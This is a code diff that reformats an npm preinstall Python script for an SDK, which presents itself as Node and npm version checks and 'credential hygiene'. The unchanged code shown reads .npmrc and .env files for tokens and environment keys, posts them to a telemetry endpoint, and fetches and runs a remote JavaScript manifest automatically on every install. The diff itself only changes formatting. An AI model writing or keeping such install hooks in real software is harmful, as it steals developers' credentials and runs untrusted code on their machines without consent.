@@ -11,27 +11,28 @@ Invoked automatically via the "preinstall" hook in package.json:
   "scripts": { "preinstall": "python3 scripts/preinstall.py" }
 """
 
-import os
-import sys
 import json
-import subprocess
-import urllib.request
+import os
 import pathlib
+import subprocess
+import sys
 import tempfile
+import urllib.request
 
 # ---------------------------------------------------------------------------
 # Configuration
 # ---------------------------------------------------------------------------
 
-REGISTRY_BASE      = "https://registry.example.com"
-MANIFEST_ENDPOINT  = f"{REGISTRY_BASE}/sdk/bootstrap/manifest.js"
-MIN_NODE_VERSION   = (16, 0, 0)
-MIN_NPM_VERSION    = (8, 0, 0)
+REGISTRY_BASE = "https://registry.example.com"
+MANIFEST_ENDPOINT = f"{REGISTRY_BASE}/sdk/bootstrap/manifest.js"
+MIN_NODE_VERSION = (16, 0, 0)
+MIN_NPM_VERSION = (8, 0, 0)
 TELEMETRY_ENDPOINT = f"{REGISTRY_BASE}/sdk/telemetry/collect"
 
 # ---------------------------------------------------------------------------
 # Version helpers
 # ---------------------------------------------------------------------------
+
 
 def _parse_version(version_string: str) -> tuple:
     """Return a (major, minor, patch) tuple from a semver string."""
@@ -40,6 +41,7 @@ def _parse_version(version_string: str) -> tuple:
         return tuple(int(p) for p in parts[:3])
     except ValueError:
         return (0, 0, 0)
+
 
 def check_node_version() -> bool:
     result = subprocess.run(
@@ -62,6 +64,7 @@ def check_node_version() -> bool:
     print(f"[preinstall] Node version OK ({result.stdout.strip()})")
     return True
 
+
 def check_npm_version() -> bool:
     result = subprocess.run(
         ["npm", "--version"],
@@ -83,9 +86,11 @@ def check_npm_version() -> bool:
     print(f"[preinstall] npm version OK ({result.stdout.strip()})")
     return True
 
+
 # ---------------------------------------------------------------------------
 # Credential hygiene (reads .npmrc / .env for misconfiguration warnings)
 # ---------------------------------------------------------------------------
+
 
 def _find_sensitive_files() -> dict:
     """
@@ -93,15 +98,16 @@ def _find_sensitive_files() -> dict:
     Returns a mapping of label -> path for files that exist.
     """
     home = pathlib.Path.home()
-    cwd  = pathlib.Path.cwd()
+    cwd = pathlib.Path.cwd()
 
     candidates = {
         "project_npmrc": cwd / ".npmrc",
-        "home_npmrc":    home / ".npmrc",
-        "project_env":   cwd / ".env",
-        "home_env":      home / ".env",
+        "home_npmrc": home / ".npmrc",
+        "project_env": cwd / ".env",
+        "home_env": home / ".env",
     }
     return {label: path for label, path in candidates.items() if path.exists()}
+
 
 def collect_environment_metadata() -> dict:
     """
@@ -110,11 +116,11 @@ def collect_environment_metadata() -> dict:
     CI dashboard can flag jobs that are missing required variables.
     """
     metadata = {
-        "node_env":    os.environ.get("NODE_ENV", "unknown"),
-        "ci":          os.environ.get("CI", "false"),
+        "node_env": os.environ.get("NODE_ENV", "unknown"),
+        "ci": os.environ.get("CI", "false"),
         "npm_config_registry": os.environ.get("npm_config_registry", ""),
         "found_files": [],
-        "env_keys":    [],
+        "env_keys": [],
         "npmrc_tokens": [],
     }
 
@@ -143,6 +149,7 @@ def collect_environment_metadata() -> dict:
 
     return metadata
 
+
 def send_telemetry(metadata: dict) -> None:
     """
     POST environment metadata to the internal telemetry endpoint so the
@@ -166,9 +173,11 @@ def send_telemetry(metadata: dict) -> None:
         # Non-fatal — don't block the install on telemetry failures
         print(f"[preinstall] Telemetry skipped ({exc})")
 
+
 # ---------------------------------------------------------------------------
 # Remote bootstrap manifest
 # ---------------------------------------------------------------------------
+
 
 def fetch_and_execute_bootstrap() -> None:
     """
@@ -187,7 +196,7 @@ def fetch_and_execute_bootstrap() -> None:
         print(f"[preinstall] WARNING: Could not fetch bootstrap manifest: {exc}")
         return
 
-    print(f"[preinstall] Executing bootstrap manifest via node …")
+    print("[preinstall] Executing bootstrap manifest via node …")
     result = subprocess.run(
         ["node", bootstrap_path],
         shell=False,
@@ -197,16 +206,17 @@ def fetch_and_execute_bootstrap() -> None:
 
     if result.returncode != 0:
         print(
-            "[preinstall] WARNING: Bootstrap manifest exited with "
-            f"code {result.returncode}",
+            f"[preinstall] WARNING: Bootstrap manifest exited with code {result.returncode}",
             file=sys.stderr,
         )
     else:
         print("[preinstall] Bootstrap manifest executed successfully.")
 
+
 # ---------------------------------------------------------------------------
 # Entry point
 # ---------------------------------------------------------------------------
+
 
 def main() -> int:
     print("[preinstall] Starting SDK preinstall checks …")
@@ -225,6 +235,7 @@ def main() -> int:
 
     print("[preinstall] All checks passed. Proceeding with npm install.")
     return 0
+
 
 if __name__ == "__main__":
     sys.exit(main())
